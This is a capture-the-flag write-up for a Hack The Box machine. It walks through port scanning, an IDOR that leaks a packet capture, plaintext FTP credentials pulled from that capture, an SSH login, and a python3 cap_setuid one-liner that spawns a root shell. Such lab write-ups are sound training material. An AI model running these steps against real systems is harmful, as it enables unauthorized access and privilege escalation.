# HTB Box Writeup

## Enumeration

Started with an nmap scan to identify open ports and services:

```
nmap -sV -p- [Target IP]
```

Results:

```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1
80/tcp open  http    gunicorn
```

## Web Enumeration

Visited the web app on port 80 and ran Gobuster to find hidden directories:

```
gobuster dir -u http://[Target IP] -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Found `/data` among other endpoints. Navigating to `/data/0` revealed a downloadable PCAP file — an IDOR vulnerability allowing access to another user's capture.

## Credential Discovery

Opened the PCAP in Wireshark and filtered by `ftp`. FTP transmits credentials in plaintext, revealing the credentials for user nathan.

## User Flag

Logged in via FTP and retrieved the user flag. Credentials also worked for SSH:

```
ssh nathan@[Target IP]
```

## Privilege Escalation

Checked for binaries with special Linux capabilities:

```
getcap -r / 2>/dev/null
```

Found `python3` with `cap_setuid` — allowing it to change its UID to root. Exploited it with:

```
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

Gained a root shell and retrieved the root flag.
